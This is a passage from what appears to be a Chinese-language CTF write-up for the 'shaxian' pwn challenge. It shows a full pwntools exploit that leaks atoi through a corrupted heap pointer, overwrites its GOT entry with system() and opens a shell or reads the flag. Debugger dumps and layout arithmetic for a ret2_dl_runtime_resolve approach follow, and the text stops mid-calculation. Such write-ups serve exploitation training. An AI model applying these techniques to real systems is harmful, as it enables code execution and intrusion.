class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)  <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)    <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_atoi_addr</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'* 2\n'</span>)</span><br><span class="line">    atoi_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> atoi_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_Hex2Dec</span><span class="params">(data)</span>:</span></span><br><span class="line">    width = <span class="number">32</span>  <span class="comment"># 16进制数所占位数</span></span><br><span class="line">    dec_data = int(hex(data)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> dec_data &gt; (<span class="number">2</span>  (width - <span class="number">1</span>) - <span class="number">1</span>):</span><br><span class="line">        tmp_data = <span class="number">2</span>  width - dec_data</span><br><span class="line">        sign_dec = <span class="number">0</span> - tmp_data</span><br><span class="line">    <span class="keyword">return</span> sign_dec</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_system_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0xDB00</span></span><br><span class="line">    <span class="comment"># dis = 0xD000</span></span><br><span class="line">    <span class="keyword">while</span> dis &lt; <span class="number">0xFFFFFF</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*Start*"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">            pwn(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"End"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            dis += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x0804B010</span></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="comment"># offset_atoi = 0x2D260</span></span><br><span class="line"><span class="comment"># offset_system = 0x3ADB0</span></span><br><span class="line"><span class="comment"># offset_puts = 0x5FCB0</span></span><br><span class="line"><span class="comment"># offset_read = 0xD5C00</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    input_info(io)</span><br><span class="line">    dian_cai(io,<span class="string">'Banmian'</span>,<span class="number">1</span>)    <span class="comment"># 先点一次菜，使atoi()函数得到调用，atoi()的GOT表得到填充</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">    dian_cai(io,payload,<span class="number">2</span>)      <span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">    atoi_addr = leak_atoi_addr(io)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"atoi_addr:"</span>,hex(atoi_addr)</span><br><span class="line">    payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,payload1,<span class="number">3</span>)     <span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br><span class="line"></span><br><span class="line">    submit(io)<span class="comment"># 释放shopping_cart结构体内存</span></span><br><span class="line">    raw_input(<span class="string">'After submit'</span>)</span><br><span class="line">    </span><br><span class="line">    system_addr = atoi_addr + dis</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line">    <span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">    <span class="keyword">print</span> system_addr</span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># 重新分配的堆块为之前释放的堆块(head_ptr - 8)，之后head_ptr指向该堆块，next = atoi_got</span></span><br><span class="line">    dian_cai(io,payload2,system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        io.writeline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.writeline(<span class="string">'/bin/cat /home/buffer/Desktop/flag'</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        data = io.recv(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag = <span class="number">1</span><span class="comment"># flag = 1表示已找到dis</span></span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        dis = <span class="number">0xDB50</span><span class="comment"># system()函数地址与atoi()函数地址的差值</span></span><br><span class="line">        <span class="comment"># dis = 0xD600# system()中调用的函数的地址与atoi()函数地址的差值</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        get_system_dis()</span><br></pre></td></tr></table></figure></p><h3 id="0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。"><a href="#0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。" class="headerlink" title="0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。"></a>0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。</h3><p>&emsp;&emsp;<code>FlappyPig</code>所给的exp我没有利用成功，我分析了一下其脚本中所使用的<code>内存布局</code>。其将<code>fake_chain</code>(也就是假的重定位项、符号项、符号字符串以及system函数参数)布置在了<code>Address缓冲区的末尾</code>，但是sym_data所对应的<code>sym_index</code>所找到的符号版本索引(ndx)为<code>0x55C3</code>，使<code>l-&gt;l_version[ndx]</code>访问到了<code>不可访问</code>的地址。但是我计算了一下，将<code>fake_chain</code>布置在<code>Address</code>，还是<code>Phone_number</code>和<code>Title</code>，只能得到少数几个符号版本表vernum(.gnu.version)中合理的ndx值，不过，这就够了。<code>ndx</code>也可以越界访问<code>l_version数组</code>，但是需要让访问到的地址的<code>version-&gt;Hash</code>位置的值为0。<code>ndx值</code>一般为下面可执行文件或libc的符号版本信息中<code>“.gnu.version_d”</code>中的index的值(Elf32_Verdef)或<code>“.gnu.version_r”</code>中的version值(Elf32_Vernaux中的vna_other成员)(实际上好像有点偏差，但不大)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V shaxian</span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 17 entries:</span><br><span class="line"> Addr: 0000000008048396  Offset: 0x000396  Link: 5 (.dynsym)</span><br><span class="line">  000:   0 (*local*)       2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">  004:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     3 (GLIBC_2.4)  </span><br><span class="line">  008:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     0 (*local*)       2 (GLIBC_2.0)  </span><br><span class="line">  00c:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     1 (*global*)   </span><br><span class="line">  010:   2 (GLIBC_2.0)  </span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x00000000080483b8  Offset: 0x0003b8  Link: 6 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: libc.so.6  Cnt: 2</span><br><span class="line">  0x0010:   Name: GLIBC_2.4  Flags: none  Version: 3</span><br><span class="line">  0x0020:   Name: GLIBC_2.0  Flags: none  Version: 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">$ readelf -V libc-2.23.so </span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 2415 entries:</span><br><span class="line"> Addr: 000000000001345c  Offset: 0x01345c  Link: 4 (.dynsym)</span><br><span class="line">  000:   0 (*local*)      24 (GLIBC_2.1)    25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)</span><br><span class="line">  004:   0 (*local*)      25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)   0 (*local*)    </span><br><span class="line">  008:  26 (GLIBC_2.3)    25 (GLIBC_PRIVATE)   7 (GLIBC_2.2)     4 (GLIBC_2.1.1)</span><br><span class="line">  00c:  11 (GLIBC_2.4)     4 (GLIBC_2.1.1)   2 (GLIBC_2.0)     3 (GLIBC_2.1)  </span><br><span class="line">  010:   4 (GLIBC_2.1.1)   e (GLIBC_2.3.2)   2 (GLIBC_2.0)    11 (GLIBC_2.4)  </span><br><span class="line">  014:   2 (GLIBC_2.0)     3 (GLIBC_2.1)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">Version definition section &apos;.gnu.version_d&apos; contains 35 entries:</span><br><span class="line">  Addr: 0x000000000001473c  Offset: 0x01473c  Link: 5 (.dynstr)  </span><br><span class="line">  000000: Rev: 1  Flags: BASE   Index: 1  Cnt: 1  Name: libc.so.6</span><br><span class="line">  0x001c: Rev: 1  Flags: none  Index: 2  Cnt: 1  Name: GLIBC_2.0</span><br><span class="line">  0x0038: Rev: 1  Flags: none  Index: 3  Cnt: 2  Name: GLIBC_2.1</span><br><span class="line">  0x0054: Parent 1: GLIBC_2.0</span><br><span class="line">  0x005c: Rev: 1  Flags: none  Index: 4  Cnt: 2  Name: GLIBC_2.1.1</span><br><span class="line">  0x0078: Parent 1: GLIBC_2.1</span><br><span class="line">........</span><br><span class="line">  0x0494: Rev: 1  Flags: none  Index: 34  Cnt: 2  Name: GLIBC_PRIVATE</span><br><span class="line">  0x04b0: Parent 1: GLIBC_2.23</span><br><span class="line">  0x04b8: Rev: 1  Flags: none  Index: 35  Cnt: 1  Name: GCC_3.0</span><br><span class="line">  Version definition past end of section</span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x0000000000014c10  Offset: 0x014c10  Link: 5 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: ld-linux.so.2  Cnt: 3</span><br><span class="line">  0x0010:   Name: GLIBC_2.3  Flags: none  Version: 38</span><br><span class="line">  0x0020:   Name: GLIBC_PRIVATE  Flags: none  Version: 37</span><br><span class="line">  0x0030:   Name: GLIBC_2.1  Flags: none  Version: 36</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>l-&gt;l_version</code>数组(link_map中的结构)应该是将<code>可执行文件</code>的符号版本信息放在前，<code>libc.so</code>的符号版本信息放在后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup()：</span><br><span class="line">0xf7fe785b    add    edx, dword ptr [edi + 0x170] ; edx = l_version[ndx]</span><br><span class="line">► 0xf7fe7861    mov    ecx, dword ptr [edx + 4] ; ecx = 0x0D696910,version-&gt;hash</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7ffd918+0x170</span><br><span class="line">00:0000│   0xf7ffda88 —▸ 0xf7fd3480 ◂— 0x0</span><br><span class="line">01:0004│   0xf7ffda8c ◂— 0x4</span><br><span class="line">02:0008│   0xf7ffda90 ◂— 0x3</span><br><span class="line">03:000c│   0xf7ffda94 ◂— 0x0</span><br><span class="line">04:0010│   0xf7ffda98 ◂— 0x5</span><br><span class="line">05:0014│   0xf7ffda9c —▸ 0x80481bc ◂— sub    byte ptr [ebx], 2</span><br><span class="line">06:0018│   0xf7ffdaa0 —▸ 0x80481c0 ◂— or     eax, 0xe000000 /* &apos;\r&apos; */</span><br><span class="line">07:001c│   0xf7ffdaa4 —▸ 0x8048198 ◂— test   dl, al</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7fd3480 300</span><br><span class="line">00:0000│ edx  0xf7fd3480 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0020│      0xf7fd34a0 —▸ 0x804838c ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">09:0024│      0xf7fd34a4 ◂— 0xd696910</span><br><span class="line">0a:0028│      0xf7fd34a8 ◂— 0x0</span><br><span class="line">0b:002c│      0xf7fd34ac —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">0c:0030│      0xf7fd34b0 —▸ 0x8048382 ◂— inc    edi /* &apos;GLIBC_2.4&apos; */</span><br><span class="line">0d:0034│      0xf7fd34b4 ◂— 0xd696914</span><br><span class="line">0e:0038│      0xf7fd34b8 ◂— 0x0</span><br><span class="line">0f:003c│      0xf7fd34bc —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">10:0040│      0xf7fd34c0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">18:0060│      0xf7fd34e0 —▸ 0xf7fd7241 ◂— dec    esp /* &apos;LINUX_2.6&apos; */</span><br><span class="line">19:0064│      0xf7fd34e4 ◂— 0x3ae75f6</span><br><span class="line">1a:0068│      0xf7fd34e8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1c:0070│      0xf7fd34f0 —▸ 0xf7fd724b ◂— dec    esp /* &apos;LINUX_2.5&apos; */</span><br><span class="line">1d:0074│      0xf7fd34f4 ◂— 0x3ae75f5</span><br><span class="line">1e:0078│      0xf7fd34f8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">28:00a0│      0xf7fd3520 —▸ 0xf7e0d2e5 ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">29:00a4│      0xf7fd3524 ◂— 0xd696910</span><br><span class="line">2a:00a8│      0xf7fd3528 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2c:00b0│      0xf7fd3530 —▸ 0xf7e0d2ef ◂— inc    edi /* &apos;GLIBC_2.1&apos; */</span><br><span class="line">2d:00b4│      0xf7fd3534 ◂— 0xd696911</span><br><span class="line">2e:00b8│      0xf7fd3538 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">30:00c0│      0xf7fd3540 —▸ 0xf7e0d2f9 ◂— inc    edi /* &apos;GLIBC_2.1.1&apos; */</span><br><span class="line">31:00c4│      0xf7fd3544 ◂— 0x9691f71</span><br><span class="line">32:00c8│      0xf7fd3548 ◂— 0x0</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p><h4 id="0x31-内存的布局"><a href="#0x31-内存的布局" class="headerlink" title="0x31 内存的布局"></a>0x31 内存的布局</h4><p>1、<code>shellcode</code>之前应该<code>预留的</code>栈空间大小</p><p>&emsp;&emsp;这里的shellcode指的是如下形式的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = p32(PLT0) + p32(reloc_offset) + p32(0x01010101) + p32(binsh_str_addr)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段shellcode的功能是使程序的控制流跳转到<code>PLT0</code>，执行符号地址解析函数<code>_dl_runtime_resolve()</code>。<code>第一个双字</code>是PLT0的地址，<code>第二个双字</code>是符号的重定位项在重定位表中的偏移，<code>第三个双字</code>是所解析函数的返回地址，<code>第四个双字</code>是所解析函数的参数。</p><p>&emsp;&emsp;由于此程序开启了<code>Partial RELRO</code>(部分重定位只读)，所以<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。程序控制流跳转到shellcode后，<code>栈</code>也跟着<code>转移</code>过来了。符号解析函数在<code>解析符号地址</code>的过程中会<code>读写</code>shellcode之前的地址上的数据。由于只有.got.plt段以后才可写，所以我们的<code>shellcode</code>应该距离<code>.got.plt段起始地址</code>有一段距离。经过测试，这个距离至少为<code>0x300字节</code>。这个值或许与<code>glibc</code>的版本有关，但影响应该不大。所以，我们的shellcode应至少在Title的缓冲区中或之后。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x804a000 r-xp     2000 0      /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804a000  0x804b000 r--p     1000 1000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804b000  0x804c000 rw-p     1000 2000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804c000  0x806d000 rw-p    21000 0      [heap]</span><br><span class="line">0xf7df9000 0xf7dfa000 rw-p     1000 0      </span><br><span class="line">0xf7dfa000 0xf7faa000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7faa000 0xf7fab000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fab000 0xf7fad000 r--p     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fad000 0xf7fae000 rw-p     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fae000 0xf7fb1000 rw-p     3000 0      </span><br><span class="line">0xf7fd3000 0xf7fd4000 rw-p     1000 0      </span><br><span class="line">0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rw-p    21000 0      [stack]</span><br><span class="line"></span><br><span class="line">1、.got.plt段的起始地址为0x804b000。</span><br><span class="line">2、此程序中现有的缓冲区：</span><br><span class="line">    # 0x0804B0C0 - 0x0804B1C0 (0x100)</span><br><span class="line">    Phone_number_buf = 0x0804B0C0</span><br><span class="line">    # 0x0804B1C0 - 0x0804B1E0 (0x20)</span><br><span class="line">    head_ptr = 0x0804B1C0</span><br><span class="line">    # 0x0804B1E0 - 0x0804B2E0 (0x100)</span><br><span class="line">    Address_buf = 0x0804B1E0</span><br><span class="line">    # 0x0804B2E0 - 0x0804B300 (0x20)</span><br><span class="line">    shopping_cart = 0x0804B2E0</span><br><span class="line">    # 0x0804B300 - 0x0804B400 (0x100)</span><br><span class="line">    Title = 0x0804B300</span><br></pre></td></tr></table></figure></p><p>2、<code>shellcode</code>与<code>fake_chain</code>的位置关系</p><p>&emsp;&emsp;<code>shellcode</code>一般在<code>fake_chain</code>的前面，这样就不会出现符号解析函数解析过程中将fake_chain数据<code>覆盖</code>的情况。就算一定要放在后面，也要与fake_chain有一个<code>安全距离</code>。</p><p>3、<code>ndx</code>的取值</p><p>&emsp;&emsp;<code>ndx值</code>一般设为<code>0</code>即可，设为别的值也可，不过要满足一定的条件。如果将fake_chain放入<code>phone_number</code>、<code>address</code>、<code>title</code>等缓冲区中，计算是否存在可用的ndx值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">计算方法：</span><br><span class="line">sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span><br><span class="line">versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">计算内存布局(大概计算，未对齐)</span><br><span class="line">Phone_number_buf  0x0804B0C0 - 0x0804B1C0</span><br><span class="line">sym_index  0x2EE - 0x2FE</span><br><span class="line">versym_data_addr  0x08048972 - 0x08048992(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Address_buf  0x0804B1E0 - 0x0804B2E0</span><br><span class="line">sym_index  0x300 - 0x310</span><br><span class="line">versym_data_addr  0x08048996 - 0x080489B6(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Title  0x0804B300 - 0x0804B400</span><br><span class="line">sym_index  0x312 - 0x322</span><br><span class="line">versym_data_addr  0x080489BA - 0x080489DA(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">l_version = 0xf7fd3480</span><br><span class="line">r_found_version *version = l-&gt;l_version[ndx] = l-&gt;l_version + ndx*0x10</span><br><span class="line"></span><br><span class="line">1、0xf7fd3000 0xf7fd4000 rw-p     1000 0 (libc-2.23.so数据段); 0 &lt;= ndx &lt;= 0xB7(只有一个合适的)</span><br><span class="line">0x080489A2    ndx = 0x8B &lt; 0xB7(hash = 0)</span><br><span class="line">sym_index = 0x306</span><br><span class="line">(因为fake_chain在Address_buf,shellcode没法放在它的前面,要留够一定栈空间,执行后面的解析函数地址程序,放在后面,解析函数地址过程中,会覆盖fake_chain,如果之间的距离大于等于0x300,则应该可以)</span><br><span class="line"></span><br><span class="line">2、0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar] ; 0xB8 &lt; ndx &lt; 0x3B8 (此段虽然可读，但是成功率比较低，也无法查看其中的数据)</span><br><span class="line">0x0804897E    ndx = 0x1C0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x2F4(未成功,收到SIGBUS, Bus error信号)</span><br><span class="line">0x08048A00    ndx = 0xF0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x335(成功,这个fake_chain不在现有缓冲区中,在Title后面的fake_chunk中)</span><br><span class="line"></span><br><span class="line">3、0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so；0x28B8 &lt; ndx &lt; 0x29B8(只有一个合适的)</span><br><span class="line">0xf7ffc210 - 0xf7fd3480 = 0x28D90</span><br><span class="line">0x080489C4    ndx = 0x28EC &lt; 0x29B8</span><br><span class="line">sym_index = 0x317(成功)</span><br><span class="line"></span><br><span class="line">4、0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so; 0x29B8 &lt; ndx &lt; 